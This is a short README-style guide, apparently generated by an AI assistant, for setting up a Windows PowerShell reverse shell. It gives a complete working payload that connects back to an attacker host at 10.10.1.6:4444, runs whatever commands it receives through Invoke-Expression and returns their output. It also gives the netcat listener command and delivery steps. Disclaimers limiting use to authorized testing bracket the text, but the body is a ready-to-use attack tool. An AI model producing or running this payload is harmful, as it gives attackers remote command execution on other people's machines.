### **Reverse Shell Setup & Execution Guide**

## **Overview**
This document provides instructions for setting up and using a **Windows Reverse Shell** to connect from a target Windows machine back to an attacker's machine. The reverse shell allows an attacker to remotely execute commands on the target system by initiating a connection from the target to the attacker’s listener.

### **Important Disclaimer**
This tool is intended for ethical penetration testing, security research, or authorized security assessments only. Unauthorized use is illegal and unethical. Always obtain explicit permission before testing any system.
---
## **Requirements**
### **Attacker Machine**
1. **Netcat** or any other listener for receiving connections from the target system.
   - Use `nc` (Netcat) to listen for incoming connections:
     ```shell
     nc -lvnp 4444
     ```

2. **PowerShell** (on the target machine):
   - The script uses PowerShell to execute commands on the target system.

### **Target Machine (Windows)**
- Windows PowerShell, which is available on most modern versions of Windows.
  
## **Payload Script Explanation**

### **PowerShell Reverse Shell Script:**
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.1.6', 4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535 | % { 0 };
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
    $sendback = (iex $data 2>&1 | Out-String);
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte, 0, $sendbyte.Length);
    $stream.Flush();
};
$client.Close();
```

### **Explanation:**
1. **TCP Connection**: The reverse shell creates a TCP connection to the attacker's machine using the specified IP (`10.10.1.6`) and port (`4444`).
2. **Data Stream**: Once connected, it listens for commands and executes them using `iex` (Invoke-Expression).
3. **Command Output**: The result of each command is sent back to the attacker, and this process continues until the connection is closed.

---

## **Setup Instructions**

### **Step 1: Set Up Listener on Attacker Machine**
On your Kali (attacker) machine, open a terminal and start a listener to receive the incoming reverse shell connection:
```bash
nc -lvnp 4444
```
This will start Netcat on port `4444`, listening for incoming connections from the target machine.

### **Step 2: Deliver the Payload to Target Machine**
 **Manual Execution**: 
   You can manually execute the script on the target machine by copying and pasting it into a PowerShell window.
   
---

## **Legal Disclaimer**

This tool is intended for use only in authorized penetration tests, security assessments, or other lawful security-related activities. Unauthorized access to computers and networks is illegal and unethical. Always obtain explicit written permission before using this tool on any system that you do not own or have authorization to test.

---

By following this README, you should be able to execute and understand the reverse shell setup for ethical hacking purposes. Let me know if you need more information or adjustments!
